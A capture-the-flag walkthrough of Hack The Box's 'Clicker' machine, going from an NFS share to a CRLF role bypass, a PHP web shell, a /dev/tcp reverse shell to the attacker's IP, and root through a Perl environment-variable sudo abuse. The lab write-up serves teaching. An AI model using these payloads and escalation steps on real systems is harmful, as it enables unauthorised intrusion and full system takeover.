---
title:  "Writeup de la máquina Clicker de Hack The Box"
date: 2023-11-29
mathjax: true
layout: post
categories: writeup
tags: ghidra burpsuite webapp php web-shell perl nmap reverse-engineering
---

# Resolución de la máquina Clicker de la plataforma de HackTheBox

![https://i.ibb.co/CH0BhMY/clicker-htb-home.webp](https://i.ibb.co/85JCnVR/Clicker.webp)

### 🔬 *"Cool Hacking always have Reverse Engineering..."*

### Enumeration

- Scan ports with Nmap looking for open ports via TCP protocol (default of Nmap),

```bash
sudo nmap 10.10.11.232 -p- --open --min-rate=5000 -sS -Pn -oG openPorts -vvv
```

- Now we know which ports are opened, so we gonna scan those ports and its services version, at the same time run default Nmap's scripts.

```bash
sudo nmap 10.10.11.232 -p 22,80,111,2049,37783,40073,43029,51063,56481 -sS -Pn -sVC -oN scanComplete -vvv
```

- We have the complete results. It's time to add the DNS `clicker.htb` to `/etc/hosts` file in our Linux attacker's machine:

```bash
10.10.11.232    clicker.htb
```

- In our web browser, Firefox, I will redirecting all **HTTP** traffic through a proxy to localhost (via IPv4) on port 8080 (127.0.0.1:8080). This will be useful to intercept and view all the traffic in Burp Suite. *(Note: In my case, I use Foxy Proxy extension to redirect HTTP traffic through localhost)*.


![https://i.ibb.co/CH0BhMY/clicker-htb-home.webp](https://i.ibb.co/CH0BhMY/clicker-htb-home.webp)

- Let's register as **normal-user** and then log in. 
- If we still looking for some in this website probably we can't found nothing.
- There are another ports open in our Nmap scan results:

```java
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO8nDXVOrF/vxCNHYMVULY8wShEwVH5Hy3Bs9s9o/WCwsV52AV5K8pMvcQ9E7JzxrXkUOgIV4I+8hI0iNLGXTVY=
|   256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAjDCjag/Rh72Z4zXCLADSXbGjSPTH8LtkbgATATvbzv
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://clicker.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  3          39189/udp6  mountd
|   100005  3          51063/tcp   mountd
|   100005  3          57941/tcp6  mountd
|   100021  1,3,4      34573/tcp6  nlockmgr
|   100021  1,3,4      43029/tcp   nlockmgr
|   100021  1,3,4      53328/udp6  nlockmgr
|   100021  1,3,4      60558/udp   nlockmgr
|   100024  1          37783/tcp   status
|   100024  1          42703/tcp6  status
|   100024  1          45391/udp   status
|   100024  1          52971/udp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)
37783/tcp open  status   syn-ack ttl 63 1 (RPC #100024)
40073/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
43029/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)
51063/tcp open  mountd   syn-ack ttl 63 3 (RPC #100005)
56481/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- We can learn about port 111 and `rpcbind` service in HackTricks: 
	- [https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind){:target="_blank"}
	- [https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting){:target="_blank"}
 
### Explotation

- We can run the following commands:

```bash
sudo mkdir /mnt/htb-content
sudo mount nfs 10.10.11.232:/mnt/backups /mnt/htb-content
```

- **That works!** Now we gotta access to internal server sharing file system in our own attacker's machine.
- Just unzip the file `clicker.htb_backup.zip`
- If we take a look to all files, we can focus on the file `save_game.php`:

```php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
    $args = [];
    foreach($_GET as $key=>$value) {
        if (strtolower($key) === 'role') {
            // prevent malicious users to modify role
            header('Location: /index.php?err=Malicious activity
 detected!');
            die;
        }
        $args[$key] = $value;
    }
    save_profile($_SESSION['PLAYER'], $_GET);
    // update session info
    $_SESSION['CLICKS'] = $_GET['clicks'];
    $_SESSION['LEVEL'] = $_GET['level'];
    header('Location: /index.php?msg=Game has been saved!');

}
?>
```

- So we can add the **parameter** `role` to try bypass our *normal-user role* to `Admin`.

![https://i.ibb.co/T20BTC8/burp-suite-crlf.webp](https://i.ibb.co/T20BTC8/burp-suite-crlf.webp)

- Picture zoom:

![https://i.ibb.co/zZ3RxTm/burp-suite-crlf-zoom.webp](https://i.ibb.co/zZ3RxTm/burp-suite-crlf-zoom.webp)

- CRLF Injection Payload:

```
%0a
```

- Request:

```
GET /save_game.php?clicks=3&level=0&role%0a=Admin HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=k04t2u6s0r3q6pd884eq4nho0l
Upgrade-Insecure-Requests: 1
```

- We've been used a CRLF Injection `(%0a)` to bypass the PHP WAF and therefore set for us the role "Admin". 
- Also we added a new parameter to manipulate the application and can give to us access ad Administrator (`&role=Admin`).
- Now we just need logout and login again to server can **reload** our **Role**:

![https://i.ibb.co/fq2B44c/clicker-htb-administration.webp](https://i.ibb.co/fq2B44c/clicker-htb-administration.webp)

- So we are **Administrators** on this web app, let's take a look...
- From Burp Suite we can see that it is possible export "**results**" also as **PHP** file, because it works

![https://i.ibb.co/pXwWmmG/burp-suite-export-php.webp](https://i.ibb.co/pXwWmmG/burp-suite-export-php.webp)

![https://i.ibb.co/zRBrJ71/export-php.webp](https://i.ibb.co/zRBrJ71/export-php.webp)

>   *Pentester Mindset*: "Server is running **PHP** and we can also export a file in **PHP** **filetype**, so: ¿Why not try to create a *PHP backdoor*? ¿Which code we need to?"

File: `export.php`

```php
<?php
session_start();
include_once("db_utils.php");

if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}

function random_string($length) {
    $key = '';
    $keys = array_merge(range(0, 9), range('a', 'z'));

    for ($i = 0; $i < $length; $i++) {
        $key .= $keys[array_rand($keys)];
    }

    return $key;
}

$threshold = 1000000;
if (isset($_POST["threshold"]) && is_numeric($_POST["threshold"])) {
    $threshold = $_POST["threshold"];
}
$data = get_top_players($threshold);
$currentplayer = get_current_player($_SESSION["PLAYER"]);
$s = "";
if ($_POST["extension"] == "txt") {
    $s .= "Nickname: ". $currentplayer["nickname"] . " Clicks: " . $currentplayer["clicks"] . " Level: " . $currentplayer["level"] . "\n";
    foreach ($data as $player) {
    $s .= "Nickname: ". $player["nickname"] . " Clicks: " . $player["clicks"] . " Level: " . $player["level"] . "\n";
  }
} elseif ($_POST["extension"] == "json") {
  $s .= json_encode($currentplayer);
  $s .= json_encode($data);
} else {
  $s .= '<table>';
  $s .= '<thead>';
  $s .= '  <tr>';
  $s .= '    <th scope="col">Nickname</th>';
  $s .= '    <th scope="col">Clicks</th>';
  $s .= '    <th scope="col">Level</th>';
  $s .= '  </tr>';
  $s .= '</thead>';
  $s .= '<tbody>';
  $s .= '  <tr>';
  $s .= '    <th scope="row">' . $currentplayer["nickname"] . '</th>';
  $s .= '    <td>' . $currentplayer["clicks"] . '</td>';
  $s .= '    <td>' . $currentplayer["level"] . '</td>';
  $s .= '  </tr>';

  foreach ($data as $player) {
    $s .= '  <tr>';
    $s .= '    <th scope="row">' . $player["nickname"] . '</th>';
    $s .= '    <td>' . $player["clicks"] . '</td>'; 
    $s .= '    <td>' . $player["level"] . '</td>';
    $s .= '  </tr>';
  }
  $s .= '</tbody>';
  $s .= '</table>';
} 

$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
file_put_contents($filename, $s);
header('Location: /admin.php?msg=Data has been saved in ' . $filename);
?>
```

- So if we add the `nickname` as parameter with one simple line of PHP code, we can create a backdoor:

Payload:
```php
<?php system($_GET['cmd']) ?>
```

- It is important to URL Encode PHP code into the request because it is in URL Path.

Request:

```
GET /save_game.php?clicks=3&level=0&role%0a=Admin&nickname=<%3fphp+system($_GET['cmd'])+%3f> HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close
Referer: http://clicker.htb/play.php
Cookie: PHPSESSID=k04t2u6s0r3q6pd884eq4nho0l
Upgrade-Insecure-Requests: 1
```

- And now just need to export to PHP format:

Request

```
POST /export.php HTTP/1.1
Host: clicker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://clicker.htb
DNT: 1
Connection: close
Referer: http://clicker.htb/admin.php
Cookie: PHPSESSID=k04t2u6s0r3q6pd884eq4nho0l
Upgrade-Insecure-Requests: 1

threshold=1000000&extension=php
```

- Now we need to access to: `http://clicker.htb/exports/top_players_lruwllg1.php?cmd=id` where we can execute our commands:

![https://i.ibb.co/j3wy803/clicker-htb-backdoor.webp](https://i.ibb.co/j3wy803/clicker-htb-backdoor.webp)

- It's time to create a **Reverse Shell**:

Payload: 

```bash
sh -i >& /dev/tcp/{IP}/{PORT} 0>&1
```

- But we need to encode in Base64 and then decode and execute with bash:

```bash
echo "sh -i >& /dev/tcp/{IP}/{PORT} 0>&1" | base64 | base64 -d | bash
```

- In Firefox or BurpSuite: 
- `http://clicker.htb/exports/top_players_lruwllg1.php?cmd=echo+"sh+-i+>%26+/dev/tcp/10.10.14.51/4545+0>%261"+|+base64+|+base64+-d+|+bash`


**YES!!** we are inside the server.

![https://i.ibb.co/T2hC1Bt/netcat.webp](https://i.ibb.co/T2hC1Bt/netcat.webp)

### Post Exploitation

- First we can spawn a Bash Shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

- We can analyze with **Ghidra** the binary `execute_query` in `/opt/manage/execute_query` to apply Reverse Engineering.

```
jack@clicker:/opt/manage$ file execute_query
execute_query: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cad57695aba64e8b4f4274878882ead34f2b2d57, for GNU/Linux 3.2.0, not stripped
```


- First transfer the file via SSH to our attacker's machine:

```bash
# From our local machine execute:
scp -i id_rsa jack@clicker.htb:/opt/manage/execute_query /home/hackermater/HTB/Machines/Clicker/content/Ghidra
```

### Ghidra

![https://i.ibb.co/n1w645L/ghidra.webp](https://i.ibb.co/n1w645L/ghidra.webp)


```cpp
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  undefined8 uVar2;
  char *pcVar3;
  size_t sVar4;
  size_t sVar5;
  char *__dest;
  long in_FS_OFFSET;
  undefined8 local_98;
  undefined8 local_90;
  undefined4 local_88;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 2) {
    puts("ERROR: not enough arguments");
    uVar2 = 1;
  }
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    pcVar3 = (char *)calloc(0x14,1);
    switch(iVar1) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar2 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar3,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar3,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar3,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar3,"clean.sql",0x14);
      break;
    default:
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
    local_98 = 0x616a2f656d6f682f;
    local_90 = 0x69726575712f6b63;
    local_88 = 0x2f7365;
    sVar4 = strlen((char *)&local_98);
    sVar5 = strlen(pcVar3);
    __dest = (char *)calloc(sVar5 + sVar4 + 1,1);
    strcat(__dest,(char *)&local_98);
    strcat(__dest,pcVar3);
    setreuid(1000,1000);
    iVar1 = access(__dest,4);
    if (iVar1 == 0) {
      local_78 = 0x6e69622f7273752f;
      local_70 = 0x2d206c7173796d2f;
      local_68 = 0x656b63696c632075;
      local_60 = 0x6573755f62645f72;
      local_58 = 0x737361702d2d2072;
      local_50 = 0x6c63273d64726f77;
      local_48 = 0x62645f72656b6369;
      local_40 = 0x726f77737361705f;
      local_38 = 0x6b63696c63202764;
      local_30 = 0x203c20762d207265;
      local_28 = 0;
      sVar4 = strlen((char *)&local_78);
      sVar5 = strlen(pcVar3);
      pcVar3 = (char *)calloc(sVar5 + sVar4 + 1,1);
      strcat(pcVar3,(char *)&local_78);
      strcat(pcVar3,__dest);
      system(pcVar3);
    }
    else {
      puts("File not readable or not found");
    }
    uVar2 = 0;
  }
LAB_001015e1:
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

- Analyzing with Ghidra the code provided, we found ...

```cpp
   else {
      puts("File not readable or not found");
    }
```

- ... that is executed if is provided any number as argument if not is in range 0-4. I mean something like this:

```bash
$: ./execute_query 0
$: ./execute_query 1
$: ./execute_query 2
...
$: ./execute_query 4
```

- So probably if we try with execute `execute_query` with any number *(**int** or **float**)* like 5 or 6.2415 or 555.01, etc..., as argument and then the file which we want read, we can read the `id_rsa` file of Jack user that is in `/etc/passwd`.

```bash
jack@clicker:/opt/manage$ ./execute_query 5.2 ../.ssh/id_rsa
```

- This works because the PATH where is executed the binary is from `/home/jack/queries`

- So let's connect via SSH with `id_rsa` file:

```bash
chmod 0600 id_rsa
ssh -i id_rsa jack@clicker.htb
```

- And we found the `user.txt` flag in `/home/jack/user.txt`
- We can read the file `monitor.sh`in `/opt` folder:

```bash
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

- And if we execute `sudo -l`we can see:

```
jack@clicker:/opt$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

- At this time, I think that we can abuse the ENV PATH ->

`(root) SETENV: NOPASSWD: /opt/monitor.sh` 

- .. -> with no password to execute the file `monitor.sh` as root privileges to get root access... But, ¿How?

> *Pentester Mindset:* "If we can execute `monitor.sh` with root privileges and no password, and that script uses Perl: we can execute `monitor.sh`script but setting custom Perl's "environment variables" that can give us root access.. in example, to execute `ls` in `/root` directory and, ¿why not? also change a bash file binary permissions like `sudo chmod u+s ./bash` to then execute `bash -p` and get root shell".

- Documentation: [https://perldoc.perl.org/search?q=environments+variables](https://perldoc.perl.org/search?q=environments+variables)

- Yes, we can. After create our plan it is time to attack!

- Now just remains to copy `/usr/bin/bash`binary to `/home/jack` and then change the owner and UID Permissions *(User ID Permissions)*:

```bash
# In $HOME Directory:
jack@clicker:~$ cp /bin/bash .
# FROM /opt Directory:
jack@clicker:/opt$ sudo PERL5OPT=-d PERL5DB='chown root:root /home/jack/bash' /opt/monitor.sh
jack@clicker:/opt$ sudo PERL5OPT=-d PERL5DB='chmod u+s /home/jack/bash' /opt/monitor.sh
# In $HOME Directory:
jack@clicker:~$ ./bash -p
bash-5.1# whoami
root
bash-5.1# cd /root/
bash-5.1# cat root.txt
# Root flag here
```

### 🕵️ Pwned!!! 🕵️

#### We got the root flag in /root/root.txt and finally complete the machine with full access to system!! 🏆

Happy Hacking!!

----

## Author: Mateo Fumis 
